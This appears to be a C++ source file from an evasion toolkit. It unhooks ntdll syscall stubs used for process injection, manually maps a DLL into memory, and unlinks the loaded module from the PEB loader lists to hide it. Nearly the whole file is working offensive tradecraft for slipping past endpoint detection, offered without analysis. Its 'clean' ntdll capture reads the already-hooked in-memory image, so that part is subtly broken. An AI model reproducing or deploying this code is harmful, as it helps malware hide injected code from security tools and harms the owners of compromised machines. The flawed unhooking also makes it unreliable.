#include "stealth_core.h"
#include <winternl.h>
#include <fstream>
#include <algorithm>

namespace MemoryStealth {

    struct MY_LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        LIST_ENTRY InInitializationOrderLinks;
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
    };

    struct MY_PEB_LDR_DATA {
        ULONG Length;
        BOOLEAN Initialized;
        PVOID SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
    };

    #pragma pack(push, 4)
    struct MY_PEB {
        BYTE InheritedAddressSpace;
        BYTE ReadImageFileExecOptions;
        BYTE BeingDebugged;
        BYTE BitField;
        PVOID Mutant;
        PVOID ImageBaseAddress;
        MY_PEB_LDR_DATA* Ldr;
    };
    #pragma pack(pop)

    static PVOID g_ntdllBase = nullptr;
    static std::vector<BYTE> g_ntdllClean;

    void CaptureCleanNtdll() {
        g_ntdllBase = GetModuleHandleW(L"ntdll.dll");
        if (!g_ntdllBase) return;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ntdllBase;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)g_ntdllBase + dos->e_lfanew);
        SIZE_T size = nt->OptionalHeader.SizeOfImage;
        g_ntdllClean.assign((BYTE*)g_ntdllBase, (BYTE*)g_ntdllBase + size);
    }

    void RestoreSyscallStub(const char* apiName) {
        if (g_ntdllClean.empty()) return;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ntdllBase;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)g_ntdllBase + dos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)g_ntdllBase + 
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (!exp) return;
        DWORD* names = (DWORD*)((BYTE*)g_ntdllBase + exp->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)g_ntdllBase + exp->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)((BYTE*)g_ntdllBase + exp->AddressOfFunctions);
        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            char* name = (char*)((BYTE*)g_ntdllBase + names[i]);
            if (!_stricmp(name, apiName)) {
                WORD ord = ordinals[i];
                DWORD rva = functions[ord];
                PVOID cleanStub = (BYTE*)g_ntdllClean.data() + rva;
                PVOID targetStub = (BYTE*)g_ntdllBase + rva;
                DWORD old;
                VirtualProtect(targetStub, 32, PAGE_EXECUTE_READWRITE, &old);
                memcpy(targetStub, cleanStub, 32);
                VirtualProtect(targetStub, 32, old, &old);
                FlushInstructionCache(GetCurrentProcess(), targetStub, 32);
                break;
            }
        }
    }

    void UnhookCriticalSyscalls() {
        RestoreSyscallStub("NtProtectVirtualMemory");
        RestoreSyscallStub("NtQuerySystemInformation");
        RestoreSyscallStub("NtAllocateVirtualMemory");
        RestoreSyscallStub("NtWriteVirtualMemory");
        RestoreSyscallStub("NtReadVirtualMemory");
        RestoreSyscallStub("NtCreateThreadEx");
        RestoreSyscallStub("NtOpenProcess");
        RestoreSyscallStub("NtQueryInformationProcess");
    }

    void Initialize() {
        CaptureCleanNtdll();
        UnhookCriticalSyscalls();
    }

    HANDLE ManualMapDll(const std::vector<BYTE>& dllBytes) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

        PVOID base = VirtualAlloc(nullptr, nt->OptionalHeader.SizeOfImage,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base) return nullptr;

        memcpy(base, dllBytes.data(), nt->OptionalHeader.SizeOfHeaders);
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            if (sec->SizeOfRawData) {
                memcpy((BYTE*)base + sec->VirtualAddress,
                       dllBytes.data() + sec->PointerToRawData,
                       sec->SizeOfRawData);
            }
        }

        if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)
                ((BYTE*)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
            DWORD_PTR delta = (DWORD_PTR)base - nt->OptionalHeader.ImageBase;
            while (reloc->VirtualAddress) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)(reloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        DWORD_PTR* patch = (DWORD_PTR*)((BYTE*)base + reloc->VirtualAddress + (entries[j] & 0xFFF));
                        *patch += delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }

        if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
            PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)
                ((BYTE*)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
            while (imp->Name) {
                char* modName = (char*)base + imp->Name;
                HMODULE mod = GetModuleHandleA(modName);
                if (!mod) mod = LoadLibraryA(modName);
                if (mod) {
                    PIMAGE_THUNK_DATA64 orig = (PIMAGE_THUNK_DATA64)((BYTE*)base + imp->OriginalFirstThunk);
                    PIMAGE_THUNK_DATA64 iat  = (PIMAGE_THUNK_DATA64)((BYTE*)base + imp->FirstThunk);
                    while (orig->u1.AddressOfData) {
                        if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                            iat->u1.Function = (DWORD_PTR)GetProcAddress(mod, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
                        } else {
                            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)((BYTE*)base + orig->u1.AddressOfData);
                            iat->u1.Function = (DWORD_PTR)GetProcAddress(mod, (LPCSTR)ibn->Name);
                        }
                        orig++; iat++;
                    }
                }
                imp++;
            }
        }

        if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
            PIMAGE_TLS_DIRECTORY64 tls = (PIMAGE_TLS_DIRECTORY64)
                ((BYTE*)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
            PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
            while (cb && *cb) {
                (*cb)(base, DLL_PROCESS_ATTACH, nullptr);
                cb++;
            }
        }

        sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            DWORD protect = PAGE_READONLY;
            if (sec->Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;
            if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) 
                protect = (protect == PAGE_READWRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
            DWORD old;
            VirtualProtect((BYTE*)base + sec->VirtualAddress, sec->Misc.VirtualSize, protect, &old);
        }

        if (nt->OptionalHeader.AddressOfEntryPoint) {
            using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
            DllMain_t entry = (DllMain_t)((BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint);
            entry((HINSTANCE)base, DLL_PROCESS_ATTACH, nullptr);
        }

        return (HANDLE)base;
    }

    void HideModuleFromPeb(HANDLE moduleBase) {
        MY_PEB* peb = (MY_PEB*)__readgsqword(0x60);
        if (!peb || !peb->Ldr) return;
        LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
        for (LIST_ENTRY* entry = head->Flink; entry != head; entry = entry->Flink) {
            MY_LDR_DATA_TABLE_ENTRY* mod = CONTAINING_RECORD(entry, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            if (mod->DllBase == moduleBase) {
                entry->Flink->Blink = entry->Blink;
                entry->Blink->Flink = entry->Flink;
                entry->Flink = entry->Blink = entry;
                break;
            }
        }
        head = &peb->Ldr->InLoadOrderModuleList;
        for (LIST_ENTRY* entry = head->Flink; entry != head; entry = entry->Flink) {
            MY_LDR_DATA_TABLE_ENTRY* mod = CONTAINING_RECORD(entry, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            if (mod->DllBase == moduleBase) {
                entry->Flink->Blink = entry->Blink;
                entry->Blink->Flink = entry->Flink;
                entry->Flink = entry->Blink = entry;
                break;
            }
        }
        head = &peb->Ldr->InInitializationOrderModuleList;
        for (LIST_ENTRY* entry = head->Flink; entry != head; entry = entry->Flink) {
            MY_LDR_DATA_TABLE_ENTRY* mod = CONTAINING_RECORD(entry, MY_LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);
            if (mod->DllBase == moduleBase) {
                entry->Flink->Blink = entry->Blink;
                entry->Blink->Flink = entry->Flink;
                entry->Flink = entry->Blink = entry;
                break;
            }
        }
    }

    void MakeRegionRx(PVOID addr, SIZE_T size) {
        DWORD old;
        VirtualProtect(addr, size, PAGE_READWRITE, &old);
        VirtualProtect(addr, size, PAGE_EXECUTE_READ, &old);
        FlushInstructionCache(GetCurrentProcess(), addr, size);
    }

    std::vector<BYTE> LoadDllFromDisk(const wchar_t* path) {
        std::ifstream f(path, std::ios::binary | std::ios::ate);
        if (!f) return {};
        size_t size = f.tellg();
        f.seekg(0);
        std::vector<BYTE> buf(size);
        f.read((char*)buf.data(), size);
        return buf;
    }

} // namespace Stealth